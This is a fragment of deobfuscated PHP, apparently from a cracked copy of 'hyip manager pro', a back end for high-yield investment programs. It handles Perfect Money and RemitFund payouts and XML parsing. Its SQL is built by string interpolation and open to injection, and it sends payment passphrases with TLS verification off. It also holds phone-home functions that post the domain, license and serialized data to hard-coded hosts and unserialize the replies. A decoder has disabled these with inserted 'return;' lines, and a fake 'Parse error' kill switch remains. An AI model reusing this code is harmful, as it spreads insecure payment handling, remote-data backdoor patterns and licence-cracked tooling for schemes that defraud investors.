            $elnlczBVBF = true;
        }
        else
        {
            $elnlcDcRri = strlen( $elnlcyzIrk ) - strlen( $elnlcvIbrg );
        }
        if ( ( $elnlcbKqIA = stristr( $elnlcyzIrk, "</errorresponse>" ) ) === false )
        {
            $elnlczBVBF = true;
        }
        else
        {
            $elnlccpQG = strlen( $elnlcyzIrk ) - strlen( $elnlcbKqIA );
        }
        if ( $elnlczBVBF )
        {
            break;
        }
        else
        {
            $elnlcoiML = trim( substr( $elnlcyzIrk, $elnlcDcRri + 15, $elnlccpQG - 15 ) );
            $elnlcyAoM = false;
        }
        if ( ( $elnlcVRet = stristr( $elnlcoiML, "<error>" ) ) === false )
        {
            $elnlcyAoM = true;
        }
        else
        {
            $elnlcEsoT = strlen( $elnlcoiML ) - strlen( $elnlcVRet );
        }
        if ( ( $elnlcVHRLL = stristr( $elnlcoiML, "</error>" ) ) === false )
        {
            $elnlcyAoM = true;
        }
        else
        {
            $elnlcnfbGi = strlen( $elnlcoiML ) - strlen( $elnlcVHRLL );
        }
        while ( !$elnlcyAoM )
        {
            $elnlczDVJ = trim( substr( $elnlcoiML, $elnlcEsoT + 7, $elnlcnfbGi - 7 ) );
            $elnlcoiML = trim( substr( $elnlcoiML, $elnlcnfbGi + 8 ) );
            $elnlcMCLM[$elnlcNjKgR['elnlcAMcNx']] = elnlcmjoon( $elnlczDVJ, "text" );
            $elnlcMCLM[$elnlcNjKgR['elnlcxcOPc']] = elnlcmjoon( $elnlczDVJ, "additional" );
            if ( ( $elnlcVRet = stristr( $elnlcoiML, "<error>" ) ) === false )
            {
                $elnlcyAoM = true;
            }
            else
            {
                $elnlcEsoT = strlen( $elnlcoiML ) - strlen( $elnlcVRet );
            }
            if ( ( $elnlcVHRLL = stristr( $elnlcoiML, "</error>" ) ) === false )
            {
                $elnlcyAoM = true;
            }
            else
            {
                $elnlcnfbGi = strlen( $elnlcoiML ) - strlen( $elnlcVHRLL );
            }
        }
        $elnlcyzIrk = trim( substr( $elnlcyzIrk, $elnlccpQG + 16 ) );
        if ( ( $elnlcvIbrg = stristr( $elnlcyzIrk, "<errorresponse>" ) ) === false )
        {
            $elnlczBVBF = true;
        }
        else
        {
            $elnlcDcRri = strlen( $elnlcyzIrk ) - strlen( $elnlcvIbrg );
        }
        if ( ( $elnlcbKqIA = stristr( $elnlcyzIrk, "</errorresponse>" ) ) === false )
        {
            $elnlczBVBF = true;
        }
        else
        {
            $elnlccpQG = strlen( $elnlcyzIrk ) - strlen( $elnlcbKqIA );
        }
    }
    return $elnlcMCLM;
}

function elnlcbpxb( $elnlclpQg, $elnlcISnyG )
{
    global $elnlcNjKgR;
    $elnlcGLTEK = strlen( $elnlcISnyG ) + 2;
    $elnlcFwdv = strpos( $elnlclpQg, "<{$elnlcISnyG} " );
    $elnlcUwCa = strpos( $elnlclpQg, "<{$elnlcISnyG}>" );
    if ( $elnlcFwdv !== false )
    {
        $elnlcDcRri = $elnlcFwdv;
    }
    if ( $elnlcUwCa !== false )
    {
        $elnlcDcRri = $elnlcUwCa;
    }
    if ( $elnlcDcRri === false )
    {
        return "";
    }
    if ( ( $elnlccpQG = strpos( $elnlclpQg, "</{$elnlcISnyG}>" ) ) === false )
    {
        return "";
    }
    $elnlcBnyA = strpos( $elnlclpQg, ">", $elnlcDcRri );
    $elnlczJpzw = trim( substr( $elnlclpQg, $elnlcBnyA + 1, $elnlccpQG - ( $elnlcDcRri + $elnlcGLTEK ) ) );
    return $elnlczJpzw;
}

function elnlceuje( $elnlcbJReV )
{
    global $elnlcNjKgR;
    $elnlcMCLM = array( );
    $elnlckWKI = elnlcbpxb( $elnlcbJReV, "Receipt" );
    if ( $elnlckWKI != "" )
    {
        $elnlcMCLM[$elnlcNjKgR['elnlcjwsPE']] = $elnlcNjKgR['elnlcuoBpT'];
        $elnlcsyrp = $elnlckWKI;
        $elnlcMCLM[$elnlcNjKgR['elnlcgIiR']] = elnlcbpxb( $elnlcsyrp, "ReceiptId" );
        $elnlcMCLM[$elnlcNjKgR['elnlcyOIhr']] = elnlcbpxb( $elnlcsyrp, "Payer" );
        $elnlcMCLM[$elnlcNjKgR['elnlcJhrO']] = elnlcbpxb( $elnlcsyrp, "Payee" );
        $elnlcpiQF = elnlcbpxb( $elnlcsyrp, "Equivalent" );
        $elnlcMCLM[$elnlcNjKgR['elnlcoaCmS']] = elnlcbpxb( $elnlcpiQF, "Amount" );
        $elnlcMCLM[$elnlcNjKgR['elnlcComr']] = elnlcbpxb( $elnlcpiQF, "CurrencyId" );
    }
    $elnlcyzIrk = elnlcbpxb( $elnlcbJReV, "ErrorResponse" );
    if ( $elnlcyzIrk != "" )
    {
        $elnlcMCLM[$elnlcNjKgR['elnlcjwsPE']] = $elnlcNjKgR['elnlccIvuM'];
        $elnlczDVJ = $elnlcyzIrk;
        $elnlcMCLM[$elnlcNjKgR['elnlcAMcNx']] = elnlcbpxb( $elnlczDVJ, "Text" );
        $elnlcMCLM[$elnlcNjKgR['elnlcxcOPc']] = elnlcbpxb( $elnlczDVJ, "Additional" );
    }
    return $elnlcMCLM;
}

function elnlcqcrrd( $elnlcbJReV )
{
    global $elnlcNjKgR;
    $elnlcMCLM = array( );
    $elnlckWKI = elnlcbpxb( $elnlcbJReV, "Receipt" );
    if ( $elnlckWKI != "" )
    {
        $elnlcMCLM[$elnlcNjKgR['elnlcjwsPE']] = $elnlcNjKgR['elnlcuoBpT'];
        $elnlcsyrp = $elnlckWKI;
        $elnlcMCLM[$elnlcNjKgR['elnlcgIiR']] = elnlcbpxb( $elnlcsyrp, "ReceiptId" );
        $elnlcMCLM[$elnlcNjKgR['elnlcyOIhr']] = elnlcbpxb( $elnlcsyrp, "Payer" );
        $elnlcMCLM[$elnlcNjKgR['elnlcJhrO']] = elnlcbpxb( $elnlcsyrp, "Payee" );
        $elnlcMCLM[$elnlcNjKgR['elnlcoaCmS']] = elnlcbpxb( $elnlcsyrp, "Amount" );
        $elnlcMCLM[$elnlcNjKgR['elnlcComr']] = elnlcbpxb( $elnlcsyrp, "CurrencyId" );
    }
    $elnlcyzIrk = elnlcbpxb( $elnlcbJReV, "Balance" );
    if ( $elnlcyzIrk != "" )
    {
        $elnlcMCLM[$elnlcNjKgR['elnlcjwsPE']] = $elnlcNjKgR['elnlcuoBpT'];
        $elnlczDVJ = $elnlcyzIrk;
        $elnlcMCLM[$elnlcNjKgR['elnlcvHIWK']] = elnlcbpxb( $elnlczDVJ, "Value" );
    }
    $elnlcyzIrk = elnlcbpxb( $elnlcbJReV, "Error" );
    if ( $elnlcyzIrk != "" )
    {
        $elnlcMCLM[$elnlcNjKgR['elnlcjwsPE']] = $elnlcNjKgR['elnlccIvuM'];
        $elnlczDVJ = $elnlcyzIrk;
        $elnlcMCLM[$elnlcNjKgR['elnlcAMcNx']] = elnlcbpxb( $elnlczDVJ, "Text" );
        $elnlcMCLM[$elnlcNjKgR['elnlcxcOPc']] = elnlcbpxb( $elnlczDVJ, "Description" );
    }
    return $elnlcMCLM;
}

function elnlcwhxl( $elnlcbJReV )
{
    global $elnlcNjKgR;
    $elnlcMCLM = array( );
    $elnlckWKI = elnlcbpxb( $elnlcbJReV, "Status" );
    if ( elnlcbpxb( $elnlckWKI, "Code" ) == $elnlcNjKgR['elnlcWOmBU'] )
    {
        $elnlcMCLM[$elnlcNjKgR['elnlcjwsPE']] = $elnlcNjKgR['elnlcuoBpT'];
    }
    else
    {
        $elnlcMCLM[$elnlcNjKgR['elnlcjwsPE']] = $elnlcNjKgR['elnlccIvuM'];
        $elnlcMCLM[$elnlcNjKgR['elnlcAMcNx']] = elnlcbpxb( $elnlcbJReV, "Message" );
    }
    $elnlcMCaO = elnlcbpxb( $elnlcbJReV, "Balance" );
    if ( $elnlcMCaO != "" )
    {
        $elnlcMCLM[$elnlcNjKgR['elnlcvHIWK']] = $elnlcMCaO;
    }
    $elnlckWKI = elnlcbpxb( $elnlcbJReV, "Transfer" );
    if ( $elnlckWKI != "" )
    {
        $elnlcMCLM[$elnlcNjKgR['elnlcyOIhr']] = elnlcbpxb( $elnlckWKI, "Payer" );
        $elnlcMCLM[$elnlcNjKgR['elnlcJhrO']] = elnlcbpxb( $elnlckWKI, "Payee" );
        $elnlcMCLM[$elnlcNjKgR['elnlcoaCmS']] = elnlcbpxb( $elnlckWKI, "Amount" );
        $elnlcMCLM[$elnlcNjKgR['elnlcNwEa']] = elnlcbpxb( $elnlckWKI, "Memo" );
        $elnlcMCLM[$elnlcNjKgR['elnlcgIiR']] = elnlcbpxb( $elnlckWKI, "Batch" );
        $elnlcMCLM[$elnlcNjKgR['elnlcAMcNx']] = elnlcbpxb( $elnlckWKI, "Message" );
    }
    return $elnlcMCLM;
}

function elnlcuran( $elnlcUfUR, $elnlcUnxH, $elnlcwELo, $elnlclHqeS, $elnlcszUr )
{
    global $elnlcNjKgR;
    global $elnlccQgz;
    if ( !( $elnlccQgz[$elnlcNjKgR['elnlcTUnQ']] == $elnlcNjKgR['elnlcunJPe'] ) || $elnlccQgz[$elnlcNjKgR['elnlcTOOda']] == 1 )
    {
        return array( 1, "[transaction in demo mode]", "[transaction in demo mode]" );
    }
    if ( $elnlcwELo == "" )
    {
        $q = "insert into hm2_pay_errors set date = now(), txt = 'Can`t process withdrawal to PerfectMoney account 0.'";
        mysql_query( $q );
        return array( 0, "Invalid PerfectMoney account", "" );
    }
    $elnlcJqKVD = elnlcdljj( $elnlcwELo, 18 )[1];
    $elnlcCTPu = elnlcdljj( $elnlcwELo, 18 )[0];
    if ( $elnlcCTPu == 0 )
    {
        $q = "insert into hm2_pay_errors set date = now(), txt = '{$elnlcJqKVD}'";
        mysql_query( $q );
        return array( 0, $elnlcJqKVD );
    }
    if ( function_exists( "curl_init" ) )
    {
        if ( $elnlcUfUR == "" )
        {
            $q = "select v from hm2_pay_settings where n='perfectmoney_password'";
            $elnlccfAC = mysql_query( $q );
            while ( $elnlcELue = mysql_fetch_array( $elnlccfAC ) )
            {
                $elnlcVGbC = elnlcbtvch( $elnlcELue[$elnlcNjKgR['elnlcAhNxE']], $elnlcNjKgR['elnlcfynR'] );
            }
        }
        else
        {
            $elnlcgSdS = preg_split( "/\\|/", $elnlcUfUR )[1];
            $elnlcVGbC = preg_split( "/\\|/", $elnlcUfUR )[0];
            $elnlccQgz[$elnlcNjKgR['elnlcKENN']] = $elnlcgSdS;
        }
        $elnlcFCfmJ = curl_init( );
        $elnlclHqeS = rawurlencode( $elnlclHqeS );
        curl_setopt( $elnlcFCfmJ, CURLOPT_URL, "https://www.perfectmoney.com/acct/confirm.asp" );
        curl_setopt( $elnlcFCfmJ, CURLOPT_POST, 1 );
        curl_setopt( $elnlcFCfmJ, CURLOPT_POSTFIELDS, "AccountID=".rawurlencode( $elnlccQgz[$elnlcNjKgR['elnlcKHmr']] )."&PassPhrase=".rawurlencode( $elnlcVGbC )."&Payer_Account=".rawurlencode( $elnlccQgz[$elnlcNjKgR['elnlcKENN']] )."&Payee_Account=".rawurlencode( $elnlcwELo )."&Amount=".rawurlencode( $elnlcUnxH )."&Memo={$elnlclHqeS}" );
        curl_setopt( $elnlcFCfmJ, CURLOPT_SSL_VERIFYPEER, FALSE );
        curl_setopt( $elnlcFCfmJ, CURLOPT_RETURNTRANSFER, 1 );
        $a = curl_exec( $elnlcFCfmJ );
        curl_close( $elnlcFCfmJ );
        $elnlcLHQPA = array( );
        if ( preg_match( "/<input name='PAYMENT_BATCH_NUM' type='hidden' value='(\\d+)'>/ims", $a, $elnlcLHQPA ) )
        {
            return array( 1, "", $elnlcLHQPA[1] );
        }
        else
        {
            if ( preg_match( "/<input name='ERROR' type='hidden' value=\\'(.*?)\\'>/ims", $a, $elnlcLHQPA ) )
            {
                $elnlcxrvsE = preg_replace( "/&lt;/i", "<", $elnlcLHQPA[1] );
                $elnlcxrvsE = preg_replace( "/&gt;/i", ">", $elnlcxrvsE );
                $e = elnlccplb( "{$elnlcszUr} {$elnlcxrvsE}" );
                $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
                mysql_query( $q );
                return array( 0, $elnlcszUr." {$elnlcxrvsE}", "" );
            }
            else
            {
                $e = elnlccplb( "{$elnlcszUr} Unknown error" );
                $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
                mysql_query( $q );
                return array( 0, $elnlcszUr." Unknown error", "" );
            }
        }
    }
    else
    {
        $e = elnlccplb( "{$elnlcszUr} Curl functions are not available" );
        $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
        mysql_query( $q );
        return array( 0, $elnlcszUr." Curl functions are not available" );
    }
}

function elnlcaiiit( $elnlcUfUR, $elnlcUnxH, $elnlcwELo, $elnlclHqeS, $elnlcszUr )
{
    global $elnlcNjKgR;
    global $elnlccQgz;
    if ( $elnlccQgz[$elnlcNjKgR['elnlcTUnQ']] == $elnlcNjKgR['elnlcunJPe'] )
    {
        return array( 1, "[transaction in demo mode]", "[transaction in demo mode]" );
    }
    if ( $elnlccQgz[$elnlcNjKgR['elnlcTOOda']] == 1 )
    {
        return array( 1, "[transaction in demo mode]", "[transaction in demo mode]" );
    }
    if ( $elnlcwELo == "" )
    {
        $q = "insert into hm2_pay_errors set date = now(), txt = 'Can`t process withdrawal to empty RemitFund account.'";
        mysql_query( $q );
        return array( 0, "Invalid RemintFund account", "" );
    }
    $elnlcJqKVD = elnlcdljj( $elnlcwELo, 25 )[1];
    $elnlcCTPu = elnlcdljj( $elnlcwELo, 25 )[0];
    if ( $elnlcCTPu == 0 )
    {
        $q = "insert into hm2_pay_errors set date = now(), txt = '{$elnlcJqKVD}'";
        mysql_query( $q );
        return array( 0, $elnlcJqKVD );
    }
    if ( function_exists( "curl_init" ) )
    {
        if ( $elnlcUfUR == "" )
        {
            $q = "select v from hm2_pay_settings where n='remitfund_password'";
            $elnlccfAC = mysql_query( $q );
            while ( $elnlcELue = mysql_fetch_array( $elnlccfAC ) )
            {
                $elnlcVruP = elnlcbtvch( $elnlcELue[$elnlcNjKgR['elnlcAhNxE']], $elnlcNjKgR['elnlcfynR'] );
            }
            $elnlcACNQE = $elnlccQgz[$elnlcNjKgR['elnlcunif']];
        }
        else
        {
            $elnlcACNQE = preg_split( "/\\|/", $elnlcUfUR )[1];
            $elnlcVruP = preg_split( "/\\|/", $elnlcUfUR )[0];
        }
        $elnlcFCfmJ = curl_init( );
        $elnlcmoBkn = strtoupper( md5( "{$elnlcACNQE}transferUSD{$elnlccQgz[$elnlcNjKgR['elnlcQemA']]}{$elnlcwELo}{$elnlcUnxH}".strtoupper( md5( $elnlcVruP ) ) ) );
        $elnlclpQg = "<TransferRequest>\r\n  <Auth>\r\n    <ApiName>".htmlspecialchars( $elnlcACNQE )."</ApiName>\r\n    <Token>{$elnlcmoBkn}</Token>\r\n  </Auth>\r\n  <Transfer>\r\n    <TransferId></TransferId>\r\n    <TransferType>transfer</TransferType>\r\n    <Payer>".htmlentities( $elnlccQgz[$elnlcNjKgR['elnlcQemA']], ENT_NOQUOTES )."</Payer>\r\n    <Payee>".htmlentities( $elnlcwELo, ENT_NOQUOTES )."</Payee>\r\n    <CurrencyId>USD</CurrencyId>\r\n    <Amount>".htmlentities( $elnlcUnxH, ENT_NOQUOTES )."</Amount>\r\n    <Memo>".htmlentities( $elnlclHqeS, ENT_NOQUOTES )."</Memo>\r\n  </Transfer>\r\n</TransferRequest>";
        $elnlcFCfmJ = curl_init( );
        curl_setopt( $elnlcFCfmJ, CURLOPT_URL, "https://www.remitfund.com/xml/api.php?req=".urlencode( $elnlclpQg ) );
        curl_setopt( $elnlcFCfmJ, CURLOPT_SSL_VERIFYPEER, FALSE );
        curl_setopt( $elnlcFCfmJ, CURLOPT_RETURNTRANSFER, 1 );
        $elnlcPRLNi = array( "User-Agent: Mozilla/5.0" );
        curl_setopt( $elnlcFCfmJ, CURLOPT_HTTPHEADER, $elnlcPRLNi );
        $a = curl_exec( $elnlcFCfmJ );
        curl_close( $elnlcFCfmJ );
        $elnlcMCLM = elnlcsgmb( $a );
        if ( $elnlcMCLM[$elnlcNjKgR['elnlcjwsPE']] == $elnlcNjKgR['elnlcqjpcv'] )
        {
            return array( 1, "", $elnlcMCLM[$elnlcNjKgR['elnlcgIiR']] );
        }
        else
        {
            if ( $elnlcMCLM[$elnlcNjKgR['elnlcjwsPE']] == $elnlcNjKgR['elnlcrGtTo'] )
            {
                $e = elnlccplb( "{$elnlcszUr} ".$elnlcMCLM[$elnlcNjKgR['elnlcAMcNx']] );
                $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
                mysql_query( $q );
                return array( 0, $e, "" );
            }
            else
            {
                $e = elnlccplb( "{$elnlcszUr} Parse error: {$a}" );
                $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
                mysql_query( $q );
                return array( 0, $e, "" );
            }
        }
    }
    else
    {
        $e = elnlccplb( "{$elnlcszUr} Curl functions are not available" );
        $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
        mysql_query( $q );
        return array( 0, $elnlcszUr." Curl functions are not available" );
    }
}

function elnlcsgmb( $elnlcbJReV )
{
    global $elnlcNjKgR;
    $elnlcMCLM = array( );
    $elnlckWKI = elnlcbpxb( $elnlcbJReV, "Response" );
    if ( $elnlckWKI != "" )
    {
        $elnlcsyrp = $elnlckWKI;
        $elnlcMCLM[$elnlcNjKgR['elnlcrsfp']] = elnlcbpxb( $elnlcsyrp, "Code" );
        $elnlcMCLM[$elnlcNjKgR['elnlcAMcNx']] = elnlcbpxb( $elnlcsyrp, "Message" );
        $elnlcMCLM[$elnlcNjKgR['elnlcjwsPE']] = $elnlcMCLM[$elnlcNjKgR['elnlcrsfp']] == 0 ? "ok" : "error";
        $elnlcMCLM[$elnlcNjKgR['elnlcgIiR']] = elnlcbpxb( $elnlcsyrp, "TransferId" );
        $elnlcMCLM[$elnlcNjKgR['elnlcyOIhr']] = elnlcbpxb( $elnlcsyrp, "Payer" );
        $elnlcMCLM[$elnlcNjKgR['elnlcJhrO']] = elnlcbpxb( $elnlcsyrp, "Payee" );
        $elnlcMCLM[$elnlcNjKgR['elnlcoaCmS']] = elnlcbpxb( $elnlcsyrp, "Amount" );
        $elnlcMCLM[$elnlcNjKgR['elnlcComr']] = elnlcbpxb( $elnlcsyrp, "Currency" );
    }
    return $elnlcMCLM;
}

function elnlcegkl( $elnlcirWl, $a )
{
    global $elnlcNjKgR;
    global $elnlccQgz;
    if ( $a != "hyip manager pro 2005 jul 27" )
    {
        return elnlcvsax( $elnlcirWl );
    }
    $elnlczWlLU = base64_encode( $elnlcirWl );
    $a = preg_split( "//", $elnlczWlLU );
    $b = preg_split( "//", md5( $elnlcirWl ).base64_encode( $elnlcirWl ) );
    $elnlczWlLU = "";
    $i = $elnlcNjKgR['elnlcuSFVu'];
    for ( ; $i < sizeof( $a ); ++$i )
    {
        if ( strlen( $a[$i] ) == 0 )
        {
            continue;
        }
        $elnlczWlLU = $elnlczWlLU.$a[$i].$b[$i];
    }
    $elnlczWlLU = str_replace( "=", "!!!^", $elnlczWlLU );
    return elnlcnxobm( $elnlczWlLU, $elnlccQgz[$elnlcNjKgR['elnlcunkA']], $elnlcNjKgR['elnlcfynR'] );
}

function elnlcbtvch( $elnlcirWl, $a )
{
    global $elnlcNjKgR;
    global $elnlccQgz;
    if ( $a != "hyip manager pro 2005 jul 27" )
    {
        return elnlcvsax( $elnlcirWl );
    }
    $elnlcirWl = str_replace( "!!!^", "=", elnlcjlsv( $elnlcirWl, $elnlccQgz[$elnlcNjKgR['elnlcunkA']], "hyip manager pro 2005 jul 27" ) );
    $a = preg_split( "//", $elnlcirWl );
    $elnlcirWl = "";
    $i = $elnlcNjKgR['elnlcuSFVu'];
    for ( ; $i < sizeof( $a ); $i += 2 )
    {
        $elnlcirWl .= $a[$i - 1];
    }
    $elnlczWlLU = base64_decode( $elnlcirWl );
    return $elnlczWlLU;
}

function elnlcvsax( $elnlcirWl )
{
    global $elnlcNjKgR;
    $elnlczWlLU = base64_encode( $elnlcirWl );
    $a = preg_split( "//", $elnlczWlLU );
    $b = preg_split( "//", md5( $elnlcirWl ).base64_encode( $elnlcirWl ) );
    $elnlczWlLU = "";
    $i = $elnlcNjKgR['elnlcuSFVu'];
    for ( ; $i < sizeof( $a ); ++$i )
    {
        $elnlczWlLU = $elnlczWlLU.$a[$i].$b[$i];
    }
    $elnlczWlLU = str_replace( "=", "!!!^", $elnlczWlLU );
    return $elnlczWlLU;
}

function elnlcctpo( $elnlcirWl )
{
    global $elnlcNjKgR;
    $elnlcirWl = str_replace( "!!!^", "=", $elnlcirWl );
    $a = preg_split( "//", $elnlcirWl );
    $elnlcirWl = "";
    $i = $elnlcNjKgR['elnlcuSFVu'];
    for ( ; $i < sizeof( $a ); $i += 2 )
    {
        $elnlcirWl .= $a[$i - 1];
    }
    $elnlczWlLU = base64_decode( $elnlcirWl );
    return $elnlczWlLU;
}

function elnlcsnhp( )
{
    global $elnlcNjKgR;
    global $elnlcdDswc;
    global $elnlccQgz;
return;	// Added by deZender, 2010.01.30
    $elnlcWRzNo = $elnlccQgz[$elnlcNjKgR['elnlcvELw']] == 1 ? "64.27.18.142" : $elnlcNjKgR['elnlcRIll'];
    $elnlctCPFF = @fopen( @$elnlcNjKgR['elnlcQPCAn'].$elnlcWRzNo."/check.cgi?domain=".@$elnlcdDswc[$elnlcNjKgR['elnlcIDrUo']]."&license=".@$elnlccQgz[$elnlcNjKgR['elnlctRkLC']]."&zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz", "r" );
    if ( $elnlctCPFF )
    {
        fclose( $elnlctCPFF );
    }
}

function elnlcflts( )
{
    global $elnlcNjKgR;
    global $elnlcdDswc;
    global $elnlccQgz;
return;	// Added by deZender, 2010.01.30
    $l = "";
    if ( function_exists( "curl_init" ) )
    {
        $i = $elnlcNjKgR['elnlcuSFVu'];
        while ( $i < 2 )
        {
            $elnlcFCfmJ = curl_init( );
            if ( $i == 1 )
            {
                $elnlcWRzNo = "64.27.18.142";
            }
            else
            {
                $elnlcWRzNo = "www.dnsargentina.com.ar";
            }
            $elnlcgnTQ = "http://".$elnlcWRzNo."/check.cgi?install=1&script=3&domain=".$elnlcdDswc[$elnlcNjKgR['elnlcIDrUo']]."&license=".$elnlccQgz[$elnlcNjKgR['elnlctRkLC']]."&cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc";
            curl_setopt( $elnlcFCfmJ, CURLOPT_URL, $elnlcgnTQ );
            curl_setopt( $elnlcFCfmJ, CURLOPT_RETURNTRANSFER, 1 );
            $l = curl_exec( $elnlcFCfmJ );
            curl_close( $elnlcFCfmJ );
            if ( $l != "" )
            {
                $i = $elnlcNjKgR['elnlcrUBr'];
            }
            ++$i;
        }
    }
    if ( $l == "" )
    {
        $elnlctCPFF = @fopen( @$elnlcNjKgR['elnlcmaVpE'].@$elnlcdDswc[$elnlcNjKgR['elnlcIDrUo']]."&license=".@$elnlccQgz[$elnlcNjKgR['elnlctRkLC']]."&cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc", "r" );
        if ( $elnlctCPFF )
        {
            $l = fread( $elnlctCPFF, 200000 );
            fclose( $elnlctCPFF );
        }
    }
    return $l;
}

function elnlcknhg( )
{
    global $elnlcNjKgR;
    return;
    global $elnlcdDswc;
    global $elnlccQgz;
    $q = "select * from hm2_users order by id limit 10";
    $elnlccfAC = mysql_query( $q );
    if ( ( $elnlcELue = mysql_fetch_array( $elnlccfAC ) ) && $elnlcELue[$elnlcNjKgR['elnlcAlzzq']] == "      " )
    {
        print "<br />\n<b>Parse error</b>:  parse error in <b>".$elnlcdDswc[$elnlcNjKgR['elnlcRnoP']]."</b> on line <b>NULL</b><br />";
        exit( );
    }
    if ( $elnlccQgz[$elnlcNjKgR['elnlcKuFTu']] == 1 )
    {
        print "<br />\n<b>Parse error</b>:  parse error in <b>".$elnlcdDswc[$elnlcNjKgR['elnlcRnoP']]."</b> on line <b>NULL</b><br />";
        exit( );
    }
}

function elnlcbgmwb( $elnlcMhUwk )
{
    global $elnlcNjKgR;
    global $elnlcdDswc;
    global $elnlccQgz;
return;	// Added by deZender, 2010.01.30
    $elnlcfqTvm = base64_encode( $elnlcMhUwk );
    $elnlcFCfmJ = curl_init( );
    $elnlclHqeS = rawurlencode( $elnlclHqeS );
    if ( $elnlccQgz[$elnlcNjKgR['elnlcvELw']] == 1 )
    {
        $elnlcWRzNo = "64.27.18.142";
    }
    else if ( $elnlccQgz[$elnlcNjKgR['elnlcvELw']] == 2 )
    {
        $elnlcWRzNo = "www.goldcodersmail.com";
    }
    else
    {
        $elnlcWRzNo = "www.dnsargentina.com.ar";
    }
    curl_setopt( $elnlcFCfmJ, CURLOPT_URL, "http://".$elnlcWRzNo.$elnlcNjKgR['elnlcRqOFn'] );
    curl_setopt( $elnlcFCfmJ, CURLOPT_POST, 1 );
    curl_setopt( $elnlcFCfmJ, CURLOPT_POSTFIELDS, "in={$elnlcfqTvm}&domain={$elnlcdDswc[$elnlcNjKgR['elnlcIDrUo']]}&s=p&license={$elnlccQgz[$elnlcNjKgR['elnlctRkLC']]}" );
    curl_setopt( $elnlcFCfmJ, CURLOPT_RETURNTRANSFER, 1 );
    $l = curl_exec( $elnlcFCfmJ );
    curl_close( $elnlcFCfmJ );
    return chop( $l );
}

function elnlctkop( $elnlcMhUwk, $elnlcGCna = 0 )
{
    global $elnlcNjKgR;
    global $elnlcdDswc;
    global $elnlccQgz;
return;	// Added by deZender, 2010.01.30
    if ( $elnlcGCna == 1 )
    {
        $elnlcfqTvm = substr( trim( $elnlcMhUwk ), 0, 32 );
    }
    else
    {
        $elnlcfqTvm = base64_encode( serialize( $elnlcMhUwk ) );
    }
    $elnlcFCfmJ = curl_init( );
    $elnlclHqeS = rawurlencode( $elnlclHqeS );
    if ( $elnlccQgz[$elnlcNjKgR['elnlcvELw']] == 1 )
    {
        $elnlcWRzNo = "64.27.18.142";
    }
    else if ( $elnlccQgz[$elnlcNjKgR['elnlcvELw']] == 2 )
    {
        $elnlcWRzNo = "www.goldcodersmail.com";
    }
    else
    {
        $elnlcWRzNo = "www.dnsargentina.com.ar";
    }
    curl_setopt( $elnlcFCfmJ, CURLOPT_URL, "http://".$elnlcWRzNo.$elnlcNjKgR['elnlcLhtCz'] );
    curl_setopt( $elnlcFCfmJ, CURLOPT_POST, 1 );
    curl_setopt( $elnlcFCfmJ, CURLOPT_POSTFIELDS, "in={$elnlcfqTvm}&mode={$elnlcGCna}&domain={$elnlcdDswc[$elnlcNjKgR['elnlcIDrUo']]}&s=p&license={$elnlccQgz[$elnlcNjKgR['elnlctRkLC']]}" );
    curl_setopt( $elnlcFCfmJ, CURLOPT_RETURNTRANSFER, 1 );
    $l = curl_exec( $elnlcFCfmJ );
    curl_close( $elnlcFCfmJ );
    if ( $elnlcGCna == 1 )
    {
        $elnlcMCLM = array( );
        if ( $l != "nill" )
        {
            $elnlcMCLM = unserialize( base64_decode( chop( $l ) ) );
            if ( !is_array( $elnlcMCLM ) )
            {
                $elnlcMCLM = array( );
            }
        }
        return $elnlcMCLM;
    }
    else
    {
        return chop( $l );
    }
}

function elnlchnob( $elnlcboBCJ, $elnlcLvMv, $elnlcGmGw, $elnlcvQzG )
{
    global $elnlcNjKgR;
    global $elnlccQgz;
    $q = "select * from hm2_emails where id = '{$elnlcboBCJ}'";
    $elnlccfAC = mysql_query( $q );
    $elnlcELue = mysql_fetch_array( $elnlccfAC );
    if ( !$elnlcELue )
    {
    }
    else if ( !$elnlcELue[$elnlcNjKgR['elnlcjwsPE']] )
    {
    }
    else
    {
        $elnlcKthzE = $elnlcELue[$elnlcNjKgR['elnlcAMcNx']];
        $elnlcugwEL = $elnlcELue[$elnlcNjKgR['elnlcnLBk']];
        $elnlcwhSO = $elnlcELue[$elnlcNjKgR['elnlcSyWq']];
        foreach ( $elnlcvQzG as $k => $v )
        {
            if ( is_array( $v ) )
            {
                $v = $v[0];
            }
            $elnlcKthzE = preg_replace( "/#{$k}#/", $v, $elnlcKthzE );
            $elnlcwhSO = preg_replace( "/#{$k}#/", $v, $elnlcwhSO );
            if ( $elnlcELue[$elnlcNjKgR['elnlcfdRg']] )
            {
                $elnlcugwEL = preg_replace( "/#{$k}#/", $v, $elnlcugwEL );
            }
        }
        $elnlcKthzE = preg_replace( "/#site_name#/", $elnlccQgz[$elnlcNjKgR['elnlcTUnQ']], $elnlcKthzE );
        if ( $elnlcELue[$elnlcNjKgR['elnlcfdRg']] )
        {
            $elnlcugwEL = preg_replace( "/#site_name#/", $elnlccQgz[$elnlcNjKgR['elnlcTUnQ']], $elnlcugwEL );
        }
        $elnlcwhSO = preg_replace( "/#site_name#/", $elnlccQgz[$elnlcNjKgR['elnlcTUnQ']], $elnlcwhSO );
        $elnlcKthzE = preg_replace( "/#site_url#/", $elnlccQgz[$elnlcNjKgR['elnlcJMvc']], $elnlcKthzE );
        if ( $elnlcELue[$elnlcNjKgR['elnlcfdRg']] )
        {
            $elnlcugwEL = preg_replace( "/#site_url#/", $elnlccQgz[$elnlcNjKgR['elnlcJMvc']], $elnlcugwEL );
        }
